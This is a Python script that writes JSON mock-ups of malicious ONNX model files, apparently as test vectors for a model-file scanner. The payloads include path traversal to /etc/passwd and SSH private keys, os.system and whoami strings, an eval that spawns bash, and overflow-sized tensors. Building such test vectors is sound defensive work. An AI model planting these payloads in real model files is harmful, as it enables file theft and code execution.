"""
ONNX Attack Vector Generator

Generates attack vectors for ONNX model files (.onnx)
"""

import json
from pathlib import Path
from typing import List, Dict, Tuple


class ONNXAttackGenerator:
    """Generate ONNX-specific attack vectors."""
    
    def __init__(self, output_dir: str = "./output"):
        """Initialize the ONNX attack generator."""
        self.output_dir = Path(output_dir) / "onnx_vectors"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.generated_files = []
    
    def generate_custom_operator_rce(self) -> Tuple[str, int]:
        """Generate ONNX with malicious custom operator.
        
        Attack Vector:
            Custom operator with:
            1. Undefined operator type
            2. Native code execution via custom kernel
            3. External library reference
            4. Platform-specific payload
        
        Impact: Arbitrary native code execution
        Severity: CRITICAL
        Detection: Op whitelist, custom op validation
        
        Returns:
            Tuple of (filepath, num_custom_ops)
        """
        filepath = self.output_dir / "01_custom_operator_rce.json"
        
        onnx_model = {
            "graph": {
                "node": [
                    {
                        "op_type": "MaliciousCustomOp",
                        "input": ["input"],
                        "output": ["output"],
                        "domain": "custom",
                        "attribute": [
                            {
                                "name": "library_path",
                                "s": "/path/to/malware.so"
                            },
                            {
                                "name": "function_name",
                                "s": "execute_payload"
                            }
                        ]
                    }
                ]
            }
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(onnx_model, f, indent=2)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 1
    
    def generate_external_data_traversal(self) -> Tuple[str, int]:
        """Generate ONNX with path traversal in external data refs.
        
        Attack Vector:
            External data reference with:
            1. ../ escape sequences
            2. Absolute path to /etc/passwd
            3. Symlink to sensitive files
            4. Directory traversal escape
        
        Impact: Unauthorized file access
        Severity: HIGH
        Detection: Path validation, canonical path checks
        
        Returns:
            Tuple of (filepath, num_traversal_paths)
        """
        filepath = self.output_dir / "02_external_data_traversal.json"
        
        traversal_model = {
            "initializer": [
                {
                    "name": "weights",
                    "attribute": [
                        {
                            "name": "location",
                            "s": "../../../../etc/passwd"
                        }
                    ]
                }
            ],
            "external_data": [
                {
                    "key": "sensitive_data",
                    "location": "/root/.ssh/id_rsa"
                },
                {
                    "key": "env_config",
                    "location": "../../../proc/self/environ"
                }
            ]
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(traversal_model, f, indent=2)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 3
    
    def generate_tensor_integrity_attack(self) -> Tuple[str, int]:
        """Generate ONNX with corrupted tensor metadata.
        
        Attack Vector:
            Tensor with:
            1. Mismatched dimensions vs data
            2. Integer overflow in size calculation
            3. Invalid dtype specification
            4. Buffer overflow trigger
        
        Impact: Memory corruption, buffer overflow
        Severity: HIGH
        Detection: Tensor validation, consistency checks
        
        Returns:
            Tuple of (filepath, num_corrupted_tensors)
        """
        filepath = self.output_dir / "03_tensor_integrity_attack.json"
        
        tensor_exploit = {
            "initializer": [
                {
                    "name": "malicious_tensor",
                    "dims": [2**32, 2**32],
                    "data_type": 10,  # Invalid type
                    "raw_data": "AAAA"  # Undersized
                }
            ],
            "tensor_validation": {
                "check_dims": False,
                "check_type": False,
                "overflow_protection": False
            }
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(tensor_exploit, f, indent=2)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 1
    
    def generate_operator_chaining_rce(self) -> Tuple[str, int]:
        """Generate ONNX with malicious operator chain.
        
        Attack Vector:
            Chain of operations:
            1. String manipulation ops -> code construction
            2. Conditional ops for payload
            3. Control flow for execution
            4. Graph manipulation attack
        
        Impact: Code execution through graph interpretation
        Severity: HIGH
        Detection: Graph flow analysis, op whitelisting
        
        Returns:
            Tuple of (filepath, num_ops)
        """
        filepath = self.output_dir / "04_operator_chaining.json"
        
        chain = {
            "graph": {
                "node": [
                    {
                        "op_type": "Constant",
                        "output": ["code_fragment"],
                        "attribute": [{"name": "value", "s": "import os; os.system"}]
                    },
                    {
                        "op_type": "Concat",
                        "input": ["code_fragment", "arg"],
                        "output": ["full_code"]
                    },
                    {
                        "op_type": "If",
                        "input": ["condition", "full_code"],
                        "output": ["result"],
                        "attribute": [{"name": "then_branch", "s": "execute(full_code)"}]
                    }
                ]
            }
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(chain, f, indent=2)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 3
    
    def generate_model_initializer_exploit(self) -> Tuple[str, int]:
        """Generate ONNX with malicious initializer.
        
        Attack Vector:
            Model initialization with:
            1. Computed from untrusted source
            2. Dynamic value assignment
            3. External data reference
            4. Callback on load
        
        Impact: Arbitrary execution at model load
        Severity: CRITICAL
        Detection: Initializer source validation
        
        Returns:
            Tuple of (filepath, num_exploits)
        """
        filepath = self.output_dir / "05_initializer_exploit.json"
        
        init_exploit = {
            "initializer": [
                {
                    "name": "dynamic_config",
                    "type": "UNDEFINED",
                    "raw_data": "__import__('os').system('id')"
                }
            ],
            "ir_version": 99999,  # Invalid version
            "opset_import": [
                {
                    "domain": "custom_malicious",
                    "version": 1
                }
            ]
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(init_exploit, f, indent=2)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 1
    
    def generate_sparse_tensor_exploit(self) -> Tuple[str, int]:
        """Generate ONNX with sparse tensor exploitation.
        
        Attack Vector:
            Sparse tensor with:
            1. Invalid indices array
            2. Mismatched sparse/dense sizes
            3. Integer overflow in index calculation
            4. Memory corruption
        
        Impact: Buffer overflow, DoS
        Severity: HIGH
        Detection: Sparse tensor validation
        
        Returns:
            Tuple of (filepath, num_vulnerabilities)
        """
        filepath = self.output_dir / "06_sparse_tensor_exploit.json"
        
        sparse_exploit = {
            "sparse_tensor": {
                "dims": [1024, 1024],
                "values": "AAAA",
                "indices": [2**32, 2**32],
                "indices_validation": False
            }
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(sparse_exploit, f, indent=2)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 2
    
    def generate_graph_attribute_injection(self) -> Tuple[str, int]:
        """Generate ONNX with code in graph attributes.
        
        Attack Vector:
            Graph attributes with:
            1. Python code in attribute values
            2. Serialized objects in attributes
            3. Function definitions in metadata
            4. Callable execution on access
        
        Impact: Code execution through attribute handling
        Severity: HIGH
        Detection: Attribute value sanitization
        
        Returns:
            Tuple of (filepath, num_malicious_attrs)
        """
        filepath = self.output_dir / "07_graph_attribute_injection.json"
        
        attr_injection = {
            "graph": {
                "attribute": [
                    {
                        "name": "model_name",
                        "s": "__import__('os').system('whoami')"
                    },
                    {
                        "name": "version",
                        "f": "__malicious_version__"
                    }
                ]
            },
            "metadata_props": [
                {
                    "key": "execution_hook",
                    "value": "eval(\"import subprocess; subprocess.call(['bash'])\")"
                }
            ]
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(attr_injection, f, indent=2)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 2
    
    def generate_all(self) -> Dict[str, Tuple[str, int]]:
        """Generate all ONNX attack vectors."""
        results = {
            "custom_operator": self.generate_custom_operator_rce(),
            "external_data_traversal": self.generate_external_data_traversal(),
            "tensor_integrity": self.generate_tensor_integrity_attack(),
            "operator_chaining": self.generate_operator_chaining_rce(),
            "initializer_exploit": self.generate_model_initializer_exploit(),
            "sparse_tensor": self.generate_sparse_tensor_exploit(),
            "graph_attributes": self.generate_graph_attribute_injection(),
        }
        return results
    
    def get_generated_files(self) -> List[str]:
        """Get list of all generated files."""
        return self.generated_files


if __name__ == "__main__":
    generator = ONNXAttackGenerator(output_dir="./output")
    results = generator.generate_all()
    for name, (path, metric) in results.items():
        print(f"{name}: {path} ({metric})")
